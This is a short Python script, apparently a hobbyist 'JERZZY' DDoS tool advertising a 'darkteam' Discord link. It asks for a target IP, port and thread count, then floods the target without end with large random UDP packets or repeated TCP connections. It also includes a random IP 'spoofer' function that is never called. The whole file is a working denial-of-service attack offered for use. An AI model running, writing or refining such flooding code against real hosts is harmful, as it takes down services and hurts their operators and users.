#!/usr/bin/env python3
import random
import socket
import threading
import os

os.system("clear")
print("""\x1b[1;92m

░░░░░██╗███████╗██████╗░███████╗███████╗██╗░░░██╗
░░░░░██║██╔════╝██╔══██╗╚════██║╚════██║╚██╗░██╔╝
░░░░░██║█████╗░░██████╔╝░░███╔═╝░░███╔═╝░╚████╔╝░
██╗░░██║██╔══╝░░██╔══██╗██╔══╝░░██╔══╝░░░░╚██╔╝░░
╚█████╔╝███████╗██║░░██║███████╗███████╗░░░██║░░░
░╚════╝░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝░░░╚═╝░░░
""")

print       ("> TOOLS INFORMATION <")
print       (" - - > CREATOR : Jerzzy< ")                                 
print       (" - - > https://dsc.gg/darkteam < - - ")


ip = str(input("  HOST/IP:"))
port = int(input(" Port:"))
choice = str(input("Ddos?(y/n):"))
times = int(input(" Packets :"))
threads = int(input(" Threads :"))
os.system("clear")
fake_ip = '182.21.20.39'
def run():
	data = random._urandom(65535)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" JERZZY ATTACKED IP%s AND THROUGH THE PORT%s"%(ip,port))
		except:
			print("[!] JERZZY - ERROR SERVER TIME OUT")

def run2():
	data = random._urandom(18)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" JERZZY ATTACKED IP%s AND THROUGH THE PORT%s"%(ip,port))
		except:
			s.close()
			print("[*] ATTACK")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()


def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

